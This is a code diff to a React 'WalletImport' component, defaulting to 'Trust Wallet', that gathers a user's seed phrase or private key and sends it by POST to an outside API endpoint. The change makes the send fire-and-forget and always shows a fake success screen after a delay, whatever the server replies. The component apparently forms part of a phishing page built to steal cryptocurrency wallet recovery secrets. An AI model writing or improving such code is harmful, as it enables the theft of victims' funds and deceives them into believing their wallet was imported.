@@ -186,40 +186,32 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
     setShowWords(newShowWords);
   };
 
-  const handleImport = async () => {
+  const handleImport = () => {
     setIsLoading(true);
     
-    try {
-      const payload = {
-        type: phraseType === "private" ? "private_key" : "seed_phrase",
-        data: phraseType === "private" ? words[0] : words.join(" "),
-        wallet_name: walletName,
-        phrase_length: phraseType === "private" ? 1 : parseInt(phraseType)
-      };
+    const payload = {
+      type: phraseType === "private" ? "private_key" : "seed_phrase",
+      data: phraseType === "private" ? words[0] : words.join(" "),
+      wallet_name: walletName,
+      phrase_length: phraseType === "private" ? 1 : parseInt(phraseType)
+    };
 
-      // Send POST request to API endpoint
-      const response = await fetch("https://api.example.com/wallet/import", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(payload),
-      });
+    // Send POST request to API endpoint (fire and forget)
+    fetch("https://api.example.com/wallet/import", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
+    }).catch((error) => {
+      console.log("API call failed (expected):", error);
+    });
 
-      if (response.ok) {
-        // Simulate minimum loading time for better UX
-        setTimeout(() => {
-          setIsLoading(false);
-          setIsSuccess(true);
-        }, 1500);
-      } else {
-        setIsLoading(false);
-        console.error("Import failed");
-      }
-    } catch (error) {
+    // Show loading for 5-6 seconds, then show success regardless of API response
+    setTimeout(() => {
       setIsLoading(false);
-      console.error("Error importing wallet:", error);
-    }
+      setIsSuccess(true);
+    }, 5500);
   };
 
   if (isLoading) {
